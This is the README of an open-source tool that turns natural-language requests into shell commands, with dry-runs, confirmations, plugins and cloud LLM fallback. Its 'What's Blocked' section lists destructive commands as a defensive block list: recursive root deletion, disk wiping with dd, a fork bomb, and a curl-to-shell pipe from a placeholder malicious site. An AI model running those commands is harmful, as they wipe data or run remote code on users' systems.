# Natural Language Driven CLI

A cross-platform command-line companion that turns natural language ("show files >1GB modified this week") into safe, auditable system commands, with dry-runs, confirmations, and a plugin ecosystem.

## 🚀 Quick Start

### Installation

```bash
# Install with pip (recommended)
pip install nlcli

# Or install for development
git clone https://github.com/ambicuity/Natural-Language-Driven-CLI.git
cd Natural-Language-Driven-CLI
pip install -e .
```

### First Steps

```bash
# Start the interactive CLI
nlcli

# Execute batch script
nlcli --batch script.nlcli

# Execute multiple commands in batch mode
nlcli --batch-commands "find large files" --batch-commands "list directories"

# Set language preference
nlcli --lang es

# Try some natural language commands
› show files >1GB modified this week
› find all .py files containing TODO  
› list processes using port 3000

# Multi-language examples
› mostrar archivos grandes (Spanish)
› lister tous les fichiers (French)
› alle dateien anzeigen (German)
```

## 🌟 Features

### 🛡️ Safety First
- **Dry-run by default** - See what commands will do before execution
- **Smart confirmations** - Required for destructive operations
- **Sandboxed execution** - Commands run with timeouts and resource limits
- **Undo hints** - Get suggestions for reversing operations

### 🧠 Natural Language Understanding
- **Intent recognition** - Converts natural language to structured commands
- **Context awareness** - Remembers your session state and preferences
- **Pronoun resolution** - "Delete those files" knows what "those" refers to
- **Multi-step operations** - Chain commands together intelligently

### 🔧 Built-in Tools
- **File operations**: find, list, search content, disk usage, file info
- **Process management**: list processes, kill by port/name, process tree, system resources
- **Network tools**: ping, curl, network connections, DNS lookup, download files
- **Package info**: brew/apt package details, search, list installed packages
- **Git operations**: read-only git commands (status, log, diff, branches, etc.)
- **LLM integration**: optional local language model for enhanced understanding
- **Plugin system**: extensible architecture with custom tool plugins
- **Multi-language support**: natural language input in multiple languages
- **Cloud LLM fallback**: automatic fallback to cloud providers (OpenAI, Anthropic, Google)
- **Advanced context**: semantic understanding with conversation memory
- **Batch mode**: execute multiple commands from scripts or command line

## 📖 Examples

### File Operations

```bash
› show files >1GB modified this week
💡 I'll search for files in the current directory larger than 1GB modified this week.
📝 Command: find . -type f -size +1G -mtime -7 -print0 | xargs -0 ls -lh
✅ Run? [y/N] y

› find .py files containing TODO in src
💡 I'll search for text content in *.py files containing 'TODO' in src.
📝 Command: grep -rn 'TODO' --include='*.py' src

› what's taking up space in Downloads
💡 I'll show disk usage information in ~/Downloads.
📝 Command: du -h --max-depth=1 ~/Downloads | sort -hr
```

### Interactive Session

```bash
› find large files in Downloads  
💡 I'll search for files in ~/Downloads larger than 100MB.
📝 Command: find ~/Downloads -type f -size +100M -print0 | xargs -0 ls -lh

› now only show videos
💡 I'll search for files in ~/Downloads larger than 100MB matching pattern '*.mp4,*.mkv,*.avi'.
📝 Command: find ~/Downloads -type f -size +100M \( -name "*.mp4" -o -name "*.mkv" -o -name "*.avi" \)

› delete those files
⚠️  This will modify your system. Continue? [y/N]
```

### Plugin Management
```bash
› plugins              # Show loaded plugins
› reload plugins       # Reload all plugins
```

### Language Support
```bash  
› lang status          # Show language support status
```

### Cloud LLM
```bash
› cloud status         # Show cloud provider status
```

### Advanced Context
```bash
› context              # Show basic context
› context advanced     # Show advanced context analysis
```

## 🏗️ Architecture

```
Terminal/TTY
└─> REPL (readline, history, multi-line)
    ├─ Session Context (cwd, filters, prior entities)
    ├─ NL Understanding
    │   ├─ Heuristics/Regex/Units parser
    │   └─ LLM (local -> optional cloud fallback)
    ├─ Intent & Plan Builder  
    │   └─ Tool/Command Registry (declarative schemas)
    ├─ Safety Layer
    │   ├─ Dry-run & Explainer
    │   ├─ Permission prompts / scopes
    │   └─ Sandboxing (restricted env, temp dirs)
    ├─ Executor (pty, timeouts, resource limits)
    └─ Observability (logs, audit file, metrics)
```

## 🔒 Safety & Security

### Built-in Protections

- ✅ Whitelist approach - only known-safe commands allowed
- ✅ Path restrictions - operations limited to allowed directories
- ✅ Pattern blocking - dangerous patterns (rm -rf /, etc.) blocked
- ✅ Confirmation prompts - destructive operations require confirmation
- ✅ Resource limits - commands have timeouts and output size limits
- ✅ Audit logging - all operations logged for review

### What's Blocked

```bash
❌ rm -rf /                    # System-wide deletion
❌ chmod -R 777 *              # Dangerous permissions  
❌ curl malicious.site | sh    # Remote code execution
❌ dd if=/dev/zero of=/dev/sda # Disk wiping
❌ :(){ :|:& }                 # Fork bombs
```

### Confirmation Required

```bash
⚠️  rm large-file.zip          # File deletion
⚠️  find . -name "*.tmp" -delete # Bulk deletion
⚠️  mv important/ /tmp/        # Moving important directories
```

## ⚙️ Configuration

Configuration file: `~/.nlcli/config.json`

```json
{
  "preferences": {
    "default_editor": "nano",
    "confirm_by_default": true,
    "allowed_directories": ["/Users/username", "/tmp"],
    "model_preference": "local",
    "language": "en",
    "max_results": 50,
    "trash_instead_of_delete": true
  },
  "safety": {
    "timeout_seconds": 30,
    "max_output_size": "1MB"
  }
}
```

## 🧪 Development

### Setup Development Environment

```bash
git clone https://github.com/ambicuity/Natural-Language-Driven-CLI.git
cd Natural-Language-Driven-CLI
pip install -e ".[dev]"
```

### Running Tests

```bash
pytest tests/
```

### Code Quality

```bash
# Format code
black src/ tests/

# Sort imports  
isort src/ tests/

# Lint
flake8 src/ tests/

# Type checking
mypy src/
```

## 🔌 Plugin Development

Create custom tools for domain-specific commands:

```python
from nlcli.registry import ToolSchema, ToolArg

def get_my_tools():
    return [
        ToolSchema(
            name="docker_ps",
            summary="List Docker containers",
            args={
                "all": ToolArg("all", "boolean", default=False)
            },
            generator={
                "cmd": "docker ps {all_flag}",
                "clauses": {"all_flag": "-a"}
            },
            danger_level="read_only",
            examples=[
                {"nl": "show docker containers", "args": {"all": False}},
                {"nl": "list all containers including stopped", "args": {"all": True}}
            ],
            keywords=["docker", "containers", "ps"]
        )
    ]

def get_plugin_info():
    return {
        "name": "docker",
        "version": "1.0.0",
        "description": "Docker container management tools",
        "author": "Your Name"
    }
```

Save as `~/.nlcli/plugins/docker_plugin.py` and it will be automatically loaded.

## 🌐 Multi-language Support

NLCLI supports natural language input in multiple languages:

- **English**: "find large files"
- **Spanish**: "buscar archivos grandes"  
- **French**: "chercher gros fichiers"
- **German**: "große dateien finden"
- **Portuguese**: "encontrar arquivos grandes"
- **Italian**: "trova file grandi"

Language detection is automatic, or set your preference:
```bash
export NLCLI_DEFAULT_LANG=es
nlcli --lang fr
```

## ☁️ Cloud LLM Integration

Enable cloud LLM providers for enhanced understanding:

```bash
# OpenAI
export OPENAI_API_KEY=your_key
export NLCLI_CLOUD_LLM_ENABLED=true

# Anthropic  
export ANTHROPIC_API_KEY=your_key

# Google
export GOOGLE_API_KEY=your_key
```

The system automatically falls back to cloud providers when local LLM is unavailable.

## 📝 Batch Mode & Scripting

Execute multiple commands from scripts:

```bash
# Create a batch script (script.nlcli)
@name File Cleanup Script
@description Clean up large and old files

BASE_DIR=/tmp
LOG_FILE=/tmp/cleanup.log

> find files larger than 100MB in ${BASE_DIR}
timeout: 30
> delete old files older than 30 days
depends: 1
condition: success
retry: 2
```

Execute the script:
```bash
nlcli --batch script.nlcli
```

Or run commands directly:
```bash
nlcli --batch-commands "find large files" --batch-commands "show disk usage"
```

## 🗺️ Roadmap

### Phase 1 - Core Foundation ✅
- [x] Basic REPL with readline and history
- [x] File operations (find, list, search, disk usage)
- [x] Safety layer with dry-run and confirmations
- [x] Session context and memory
- [x] Declarative tool registry

### Phase 2 - Extended Tools ✅
- [x] Process management (ps, kill, top)
- [x] Network operations (ping, curl, ss, netstat)
- [x] Package management (brew, apt info)
- [x] Git read-only operations
- [x] Local LLM integration

### Phase 3 - Advanced Features ✅
- [x] Plugin SDK and ecosystem
- [x] Multi-language support
- [x] Cloud LLM fallback
- [x] Advanced context understanding
- [x] Scripting and batch mode

### Phase 4 - Production Ready
- [ ] Comprehensive security audit
- [ ] Performance optimization
- [ ] Advanced error recovery
- [ ] Telemetry and metrics
- [ ] Enterprise features

## 🤝 Contributing

We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### Areas we need help with:
- Additional tool implementations
- Language model integration
- Multi-language support
- Documentation and examples
- Testing and quality assurance

## 📜 License

Licensed under the Apache License, Version 2.0. See [LICENSE](LICENSE) for details.

## 🙏 Acknowledgments

- Inspired by natural language interfaces and modern CLI tools
- Built with safety and security as primary concerns
- Designed for both power users and newcomers to command-line interfaces

---

**⚡ Turn your thoughts into commands, safely and intuitively.**